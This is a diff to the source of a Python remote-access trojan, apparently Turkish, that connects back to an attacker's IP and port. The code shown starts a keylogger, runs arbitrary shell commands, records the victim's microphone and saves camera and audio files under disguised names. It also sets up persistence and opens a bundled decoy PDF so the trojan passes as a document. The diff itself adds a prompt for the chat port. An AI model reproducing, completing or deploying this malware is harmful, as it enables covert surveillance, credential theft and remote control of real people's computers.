@@ -16,7 +16,6 @@ import tkinter
 
 ip = "192.168.1.105" # Bu değerleri kendinize göre değiştirin.
 port = 4444 # Bu değerleri kendinize göre değiştirin.
-sohbet_port = 5555
 
 my_thread = threading.Thread(target=kg.kg_Start)
 my_thread.start()
@@ -30,15 +29,20 @@ class Soket_baglanti():
         self.kamera_dosyasi = os.environ["appdata"] + "\\windowsupdate.png"
         self.ses_dosyasi = os.environ["appdata"] + "\\windowssounds.wav"
         self.Mikrofon_Sorusu()
+        self.Chat_Port_Sorusu()
 
     def Mikrofon_Sorusu(self):
         sorunun_cevabi = self.Json_Al()
         if sorunun_cevabi == "E" or sorunun_cevabi == "e":
             my_thread2 = threading.Thread(target=self.Ses_Kayit_Basla)
             my_thread2.start()
-            self.Json_Gonder("[+]Kurbanin mikrofonu kaydedilmeye başlandı.")
-        elif sorunun_cevabi == "H" or sorunun_cevabi == "h":
-            self.Json_Gonder("[+]Kurbanin mikrofonu kaydedilmeyecek.")
+
+    def Chat_Port_Sorusu(self):
+        sorunun_cevabi = self.Json_Al()
+        if sorunun_cevabi == 5555:
+            self.sohbet_port = 5555
+        else:
+            self.sohbet_port = sorunun_cevabi
 
     def Komut_Calistir(self, komut):
         komut_cikisi = subprocess.check_output(komut, shell=True)
@@ -153,7 +157,7 @@ class Soket_baglanti():
 
     def Sohbet(self):
         self.chat_baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.chat_baglanti.connect((ip,sohbet_port))
+        self.chat_baglanti.connect((ip,self.sohbet_port))
         self.chat_gui = tkinter.Tk()
         self.chat_gui.resizable(False, False)
         self.chat_gui.config(bg="#D9D8D7")
@@ -273,9 +277,10 @@ def Kaliclik():
         pass
 
 def Eklenmis_Dosya_Ac():
-    added_file = sys._MEIPASS + "\\ornekdosya.pdf" # '\\' dan sonra trojan ile açılmasını istediğiniz dosyayı yazınız.
+    added_file = sys._MEIPASS + "\\ornekdosya.pdf" # '\\' dan sonra trojan ile açılmasını istediğiniz dosyayı
+    # yazınız.
     subprocess.Popen(added_file,shell=True)
 
-#Eklenmis_Dosya_Ac()
+#Eklenmis_Dosya_Ac() # Eğer aktifleştirdiyseniz bu komutun başındaki '#' işaretini silin.
 Kaliclik()
 Baglanti_Dene()
